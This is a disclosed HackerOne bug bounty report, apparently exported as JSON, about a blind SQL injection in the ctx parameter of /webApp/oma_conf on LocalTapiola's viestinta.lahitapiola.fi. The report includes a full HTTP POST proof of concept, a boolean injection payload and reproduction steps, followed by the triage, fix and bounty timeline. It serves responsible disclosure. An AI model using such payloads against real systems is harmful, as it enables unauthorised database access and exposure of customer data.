{"id":181803,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4MDM=","url":"https://hackerone.com/reports/181803","title":"SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-11-12T17:58:34.924Z","submitted_at":"2016-11-12T17:58:34.924Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-12-08T13:19:18.694Z","bug_reporter_agreed_on_going_public_at":"2016-12-08T13:19:18.651Z","team_member_agreed_on_going_public_at":"2016-12-08T13:17:59.151Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Vulnerable script**: /webApp/oma_conf\n**Vulnerable parameter**: ctx[vars][email]\n**Database**: PostgreSQL\n\n**PoC**\n```http\nPOST /webApp/oma_conf HTTP/1.1\nHost: viestinta.lahitapiola.fi\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1131\n\nctx=%3Cctx+lang%3D%22en%22+date%3D%222016-11-12T17%3A33%3A06Z%22+_target%3D%22web%22+webApp-id%3D%22235234841%22+_folderModel%3D%22nmsRecipient%22%3E%3CuserInfo+datakitInDatabase%3D%22true%22+homeDir%3D%22%22+instanceLocale%3D%22en-US%22+locale%3D%22en-US%22+login%3D%22webapp%22+loginCS%3D%22Web+applications+agent+%28webapp%29%22+loginId%3D%223290%22+noConsoleCnx%3D%22true%22+orgUnitId%3D%220%22+theme%3D%22%22+timezone%3D%22Europe%2FHelsinki%22+xmlns%3ASOAP-ENV%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22+xmlns%3Ans%3D%22urn%3Axtk%3Asession%22+xmlns%3Axsd%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%3E%3Clogin-right+right%3D%22admin%22%2F%3E%3C%2FuserInfo%3E%3Ctimezone+current%3D%22Europe%2FHelsinki%22+changed%3D%22false%22%2F%3E%3Cvars%3E%3CcustomerId%3E0%3C%2FcustomerId%3E%3Caction%3Ein%3C%2Faction%3E\n%3Cemail%3Etest%40test.ru' and substr(version(),1,10) = 'PostgreSQL' and '1%3C%2Femail%3E\n%3C%2Fvars%3E%3CactivityHistory%3E%3Cactivity+name%3D%22page%22%2F%3E%3C%2FactivityHistory%3E%3C%2Fctx%3E\u0026userAction=next\u0026transition=\n```\n\n**Steps to reproduce**\n1. Open http://viestinta.lahitapiola.fi/webApp/oma_conf\n2. Fill in the form value `' and substr(version(),1,10) = 'PostgreSQL' and '1`\n3. Result `Kiitos tilauksestasi!`\n4. Fill in the form value `' and substr(version(),1,10) = 'PostgreXXX' and '1`\n5. Result `An error occurred.`","bounty_amount":"1350.0","formatted_bounty":"$1,350","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-07T13:17:59.177Z","allow_singular_disclosure_after":-150165412.46446759,"singular_disclosure_allowed":true,"vote_count":50,"voters":["delimitry","derision","bobrov","hunter","tk0","suv","bogdantcaciuc","spam404","s_p_q_r","dzmitry","and 40 more..."],"severity":{"rating":"medium","score":5.9,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1296565,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.","automated_response":false,"created_at":"2016-11-12T18:20:25.789Z","updated_at":"2016-11-12T18:20:25.789Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1296568,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-11-12T18:21:18.402Z","updated_at":"2016-11-12T18:21:18.402Z","additional_data":{"old_title":"[viestinta.lahitapiola.fi] SQL Injection /webApp/oma_conf ctx parameter","new_title":"SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1297534,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This is verified. There is no schedule for a fix at the moment - the process for running quick fixes in this new domain is a bit different.","automated_response":false,"created_at":"2016-11-14T08:09:37.033Z","updated_at":"2016-11-14T08:09:37.033Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1300251,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello, we have been informed that this is now fixed. Could you verify and let us know if you agree?","automated_response":false,"created_at":"2016-11-15T12:21:18.925Z","updated_at":"2016-11-15T12:21:18.925Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1300260,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"The vulnerability is still reproduced.","automated_response":false,"created_at":"2016-11-15T12:28:14.453Z","updated_at":"2016-11-15T12:28:14.453Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1305035,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello, we have been informed that this is now fixed. Could you verify and let us know if you agree?","automated_response":false,"created_at":"2016-11-17T14:49:29.859Z","updated_at":"2016-11-17T14:49:29.859Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1305681,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"It seems that now it is fixed.","automated_response":false,"created_at":"2016-11-17T21:12:57.210Z","updated_at":"2016-11-17T21:12:57.210Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1350517,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We have decided to award you with a bounty.","automated_response":false,"created_at":"2016-12-08T13:16:18.532Z","updated_at":"2016-12-08T13:16:18.532Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"350.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1350519,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your effort.","automated_response":false,"created_at":"2016-12-08T13:16:40.656Z","updated_at":"2016-12-08T13:16:40.656Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1350525,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-12-08T13:17:47.601Z","updated_at":"2016-12-08T13:17:47.601Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":7263,"new_severity_id":12511},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1350527,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-08T13:17:59.164Z","updated_at":"2016-12-08T13:17:59.164Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1350531,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-08T13:19:18.672Z","updated_at":"2016-12-08T13:19:18.672Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1350532,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-12-08T13:19:18.710Z","updated_at":"2016-12-08T13:19:18.710Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1434417,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2017-01-21T09:29:12.859Z","updated_at":"2017-01-21T09:29:12.859Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (5.9)","old_severity_id":12511,"new_severity_id":20813},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1434422,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We have found that the underlying infrastructure and database contained a limited set of non-public customer related information. For this reason, we have decided to award this report with an additional bonus.","automated_response":false,"created_at":"2017-01-21T09:30:05.658Z","updated_at":"2017-01-21T09:30:05.658Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"1000.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1434434,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Wow, thanks","automated_response":false,"created_at":"2017-01-21T09:40:41.592Z","updated_at":"2017-01-21T09:40:41.592Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3063,"category":"team","content":"##Issue\n\nThe reporter found an SQL injection in one of the applications in viestinta.lahitapiola.fi. \n\n##Fix\n\nThe issue was investigated and found to be valid and critical. \n\n##Reasoning\n\nThe reported case was valid and right on target for the scope of the bug bounty program. SQL injections are always critical as they pose a serious threat to the underlying database and the information therein. Even in the case of the data being public information - as was the case here -  there are still many vectors for seriously misusing this kind of a vulnerability. \n\nThe bounty decision was based on the fact that the reporter found two very similar vulnerabilities (a pattern issue, #181803 and #181826) -  the bounty was bundled and then split amongst both reports.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"id":3067,"category":"researcher","content":"I do not agree that this is a very similar vulnerabilities ( #181803 and #181826 ). \nThus we can say that all SQL injection similar to each other.\nBut never mind, thanks for bounty.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":2205,"username":"bobrov","name":"Sergey Bobrov","bio":"@Black2Fan","cleared":false,"website":"https://twitter.com/Black2Fan","location":"Russia","created_at":"2014-01-14T04:31:42.053Z","url":"https://hackerone.com/bobrov","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}